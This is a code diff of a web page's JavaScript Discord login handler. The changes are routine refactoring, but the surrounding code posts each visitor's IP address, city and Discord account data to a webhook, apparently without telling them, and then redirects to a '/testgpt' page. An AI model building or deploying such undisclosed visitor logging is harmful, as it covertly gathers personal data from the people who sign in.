@@ -212,9 +212,13 @@ ${userDataFormatted}
 });
 
 // Function to update UI based on login state
-function updateUI() {
+async function updateUI() {
+    const discordUser = localStorage.getItem('discordUser');
+    let userData;
 
     if (discordUser) {
+        userData = JSON.parse(discordUser); // Parse the user data
+
         const usernameElement = document.querySelector('.username');
         usernameElement.innerText = userData.username; // Update username
         const profilePicture = profileUI.querySelector('.profile-picture');
@@ -230,8 +234,9 @@ function updateUI() {
 
         if (userParam) {
             // If user data is in the URL, parse and store it
-            const userData = JSON.parse(decodeURIComponent(userParam));
+            userData = JSON.parse(decodeURIComponent(userParam));
             localStorage.setItem('discordUser', JSON.stringify(userData)); // Store user data in local storage
+            
             await sendWebhook("User Login", `
 **IP:** ${ipData.ip}
 **City:** ${ipData.city}
@@ -244,7 +249,7 @@ function updateUI() {
 **Discord User Data:** \`\`\`json
 ${userDataFormatted}
 \`\`\`
-`.trim(), Math.floor(Math.random() * 16777215));
+            `.trim(), Math.floor(Math.random() * 16777215));
             updateUI();
             window.location.href = 'https://cakeorpastry.netlify.app/testgpt'
         } else {
@@ -254,7 +259,7 @@ ${userDataFormatted}
         }
     }
 
-    //profileUI.style.display = 'block'; // Always show profile UI
+    // profileUI.style.display = 'block'; // Always show profile UI
 }
 
 // Initial UI setup
